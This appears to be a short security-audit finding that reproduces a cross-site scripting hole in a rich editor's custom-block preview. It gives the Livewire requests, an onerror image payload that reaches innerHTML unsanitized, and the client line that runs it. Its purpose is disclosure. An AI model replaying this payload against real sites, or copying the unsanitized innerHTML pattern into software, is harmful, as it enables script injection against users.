### VULN-010 — the custom-block insert flow. Full capture in response.txt / browser.log.
### The editor-PREVIEW path base64's toPreviewHtml(config) with NO Str::sanitizeHtml (the reader
### path DOES sanitize), and the client injects it via innerHTML.

### 1) Mount the custom-block insert action (richEditorCustomBlocks editor)
POST /livewire/update  (calls: mountAction "customBlock"
  {"id":"rawhtml","mode":"insert","editorSelection":{"type":"node","anchor":0,"head":0}}
  context {"schemaComponent":"form.richEditorCustomBlocks"})

### 2) Set the block config body to a payload and submit
POST /livewire/update  (updates {"mountedActions.0.data.body":
    "<img src=x onerror=\"document.title='PWNED-<suffix>'\">"}; calls: callMountedAction)
### Server response dispatches run-rich-editor-commands carrying
###   base64("<img src=x onerror=...>")  — i.e. the RAW, unsanitized payload.
### Reader path for the same HTML: Str::sanitizeHtml(...) => <img src="x" />  (onerror stripped).

### 3) Client (extension-custom-block.js:132): preview.innerHTML = atob(node.attrs.preview)
###   → the onerror fires → document.title becomes "PWNED-<suffix>" (proof of execution).
